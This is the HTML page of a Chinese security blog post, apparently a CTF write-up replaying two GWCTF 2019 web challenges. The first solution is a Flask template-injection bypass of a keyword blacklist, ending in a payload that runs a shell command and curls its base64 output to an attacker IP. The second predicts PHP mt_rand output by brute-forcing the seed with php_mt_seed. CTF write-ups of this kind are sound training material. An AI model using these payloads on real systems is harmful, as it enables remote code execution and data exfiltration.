@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现
+ 你的名字 考点：flaskSSTI、绕过{{}}过滤、黑名单过滤逻辑错误
+很详细的SSTI&amp;raquo;：https://xz.aliyun.com/t/6885#toc-4
+SSTIbypass姿势&amp;raquo;https://p0sec.net/index.php/archives/120/
+参考：&amp;raquo;ggb0n
+打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。
+尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 ”
+不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；
+但是可以通过 {%%} 类似的方式来进行注入，尝试 {%if 1%}1{% endif%} ，发现服务器直接给出500错误。。。判断可能有什么过滤
+直接输入if，返回结果是：
+hello !说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
+参考了师傅写的wp，fuzz出来的过滤可能是这个样子：
+blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.'><title>GWCTF 2019 复现</title>
+
+<link rel='canonical' href='https://example.com/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='GWCTF 2019 复现'>
+<meta property='og:description' content='之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现
+ 你的名字 考点：flaskSSTI、绕过{{}}过滤、黑名单过滤逻辑错误
+很详细的SSTI&amp;raquo;：https://xz.aliyun.com/t/6885#toc-4
+SSTIbypass姿势&amp;raquo;https://p0sec.net/index.php/archives/120/
+参考：&amp;raquo;ggb0n
+打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。
+尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 ”
+不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；
+但是可以通过 {%%} 类似的方式来进行注入，尝试 {%if 1%}1{% endif%} ，发现服务器直接给出500错误。。。判断可能有什么过滤
+直接输入if，返回结果是：
+hello !说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
+参考了师傅写的wp，fuzz出来的过滤可能是这个样子：
+blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.'>
+<meta property='og:url' content='https://example.com/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="GWCTF 2019 复现">
+<meta name="twitter:description" content="之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现
+ 你的名字 考点：flaskSSTI、绕过{{}}过滤、黑名单过滤逻辑错误
+很详细的SSTI&amp;raquo;：https://xz.aliyun.com/t/6885#toc-4
+SSTIbypass姿势&amp;raquo;https://p0sec.net/index.php/archives/120/
+参考：&amp;raquo;ggb0n
+打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。
+尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 ”
+不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；
+但是可以通过 {%%} 类似的方式来进行注入，尝试 {%if 1%}1{% endif%} ，发现服务器直接给出500错误。。。判断可能有什么过滤
+直接输入if，返回结果是：
+hello !说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
+参考了师傅写的wp，fuzz出来的过滤可能是这个样子：
+blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://example.com" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/">GWCTF 2019 复现</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <p>之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现</p>
+<hr>
+<h3 id="你的名字httpsbuuojcnchallengesgwctf202019你的名字"><a class="link" href="https://buuoj.cn/challenges#[GWCTF%202019]%e4%bd%a0%e7%9a%84%e5%90%8d%e5%ad%97"  target="_blank" rel="noopener"
+    >你的名字</a></h3>
+<p>考点：flaskSSTI、绕过<code>{{}}</code>过滤、黑名单过滤逻辑错误</p>
+<p>很详细的SSTI&raquo;：https://xz.aliyun.com/t/6885#toc-4</p>
+<p>SSTIbypass姿势&raquo;<a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
+<p>参考：&raquo;<a class="link" href="http://ggb0n.cool/2020/03/04/GWCTF2019%e5%a4%8d%e7%8e%b0/"  target="_blank" rel="noopener"
+    >ggb0n</a></p>
+<p>打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。</p>
+<p>尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &lsquo;{&rsquo; in \var\WWW\html\test.php on line 13 ”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170318.png" alt="img"  /></p>
+<p>不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；</p>
+<p>但是可以通过 <code>{%%}</code> 类似的方式来进行注入，尝试 <code>{%if 1%}1{% endif%}</code> ，发现服务器直接给出500错误。。。判断可能有什么过滤</p>
+<p>直接输入if，返回结果是：</p>
+<pre><code>hello !
+</code></pre><p>说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。</p>
+<p>参考了师傅写的wp，fuzz出来的过滤可能是这个样子：</p>
+<pre><code>blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',
+                 'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',
+                 'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 
+                 'func_globals', 'config']
+for no in blacklist:
+    while True:
+        if no in s:
+            s = s.replace(no, '')
+        else:
+            break
+return s
+</code></pre><p>考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 <code>if=&gt;iconfigf</code> ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 <code>config</code> 被替换之后，过滤也就结束了。</p>
+<p>那么我们在所有被过滤的关键词中间都可以插入一个config来避开过滤；</p>
+<p>最终playlaod：</p>
+<pre><code>{% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`ls \|base64`') %}1{% endiconfigf %}
+#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机
+</code></pre><p>flag{a2bc941d-a38d-42bb-97be-fe2440442cdf}</p>
+<h3 id="枯燥的抽奖httpsbuuojcnchallengesgwctf202019枯燥的抽奖"><a class="link" href="https://buuoj.cn/challenges#[GWCTF%202019]%e6%9e%af%e7%87%a5%e7%9a%84%e6%8a%bd%e5%a5%96"  target="_blank" rel="noopener"
+    >枯燥的抽奖</a></h3>
+<p>考点：PHP逆向脚本、PHP伪随机数爆破</p>
+<p>打开题目，叫你猜数据，并且给了前10位：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170333.png" alt="img"  /></p>
+<p>随便输一个提交，随即给出源码：</p>
+<pre><code>&lt;?php
+#这不是抽奖程序的源代码！不许看！
+header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
+}
+
+mt_srand($_SESSION['seed']);
+$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$str='';
+$len1=20;
+for ( $i = 0; $i &lt; $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;
+
+
+if(isset($_POST['num'])){
+    if($_POST['num']===$str){x
+        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;
+    }
+    else{
+        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;
+    }
+}
+show_source(&quot;check.php&quot;);
+</code></pre><p>意思大概是：</p>
+<p>一个20次的循环，每次从 <code>$str_long1</code> 随机取一个字符，拼接成最后的 <code>$str</code> 。</p>
+<ul>
+<li>当 <code>mt_rand()</code> 函数运行的时候，会检查有没有播种 <code>mt_srand</code> 如果已经播种了，就直接取随机数，其实这里和C语言一样（PHP底层是C）如果不每次重新播种的话，随机数怎么取都是一样的</li>
+</ul>
+<p>我们来写段代码。</p>
+<pre><code>&lt;?php
+mt_srand(12345);
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+?&gt;
+</code></pre><p>我们访问，输出 <code>162946439</code> 。</p>
+<p>现在代码改为</p>
+<pre><code>&lt;?php 
+mt_srand(12345); 
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+?&gt;
+</code></pre><p>我们再次访问:</p>
+<pre><code>162946439
+
+247161732
+
+1463094264
+
+1878061366
+
+394962642
+</code></pre><p>现在细心的人可能已经发现，第一个数 <code>162946439</code> 存在猫腻了。</p>
+<p>为什么生成随机数会一样呢？我们多次访问。震惊:
+还是</p>
+<pre><code>162946439
+
+247161732
+
+1463094264
+
+1878061366
+
+394962642
+</code></pre><p>其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p>生成伪随机数是线性的，你可以理解为 <code>y=ax</code> , <code>x</code> 就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数)了吗
+当然，实际上更复杂肯定。</p>
+<p>我知道种子后，可以确定你输出伪随机数的序列。
+知道你的随机数序列，可以确定你的种子。</p>
+<p>用到的是爆破，已经有写好的<a class="link" href="https://www.openwall.com/php_mt_seed/"  target="_blank" rel="noopener"
+    >C脚本</a>了。</p>
+<p>我们的思路就是根据他给出的10为数据，来爆破他的随机数种子，然后在把剩下的随机数输出</p>
+<p>因为是用的php_mt_seed，我们要用他的格式，这是转换成随机数的脚本</p>
+<pre><code>&lt;?php
+$pass_now = &quot;JAfq968Gqy&quot;;//给出的密钥
+$allowable_characters = '
+abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';//字母表
+
+$length = strlen($allowable_characters) - 1;
+
+for ($j = 0; $j &lt; strlen($pass_now); $j++) {//遍历密钥
+    for ($i = 0; $i &lt; $length; $i++) {//遍历字母表
+        if ($pass_now[$j] == $allowable_characters[$i]) {
+            echo &quot;$i $i 0 $length &quot;;
+            break;
+        }
+    }
+}
+?&gt;
+</code></pre><p>运行，得到</p>
+<pre><code>45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 
+42 0 61 16 16 0 61 24 24 0 61
+</code></pre><p>把php_mt_seed下载解压之后，运行命令：</p>
+<pre><code>make
+./php_mt_seed 45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 
+34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61
+</code></pre><p>可以得到他的随机数种子</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170347.png" alt="img"  /></p>
+<p>然后我们直接把他原来的代码拷贝过来，种子替换为我们爆破出来的：</p>
+<pre><code>&lt;?php
+mt_srand(591614089);
+$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$str='';
+$len1=20;
+for ( $i = 0; $i &lt; $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 20);
+echo $str_show;
+?&gt;
+</code></pre><p>运行得到一串字符 <code>JAfq968GqyhRKQTHLc8j</code> ，开头恰巧就是他给的，提交获得flag</p>
+<p>flag{37c86593-2593-4566-b3cd-18081cbe44d0}</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
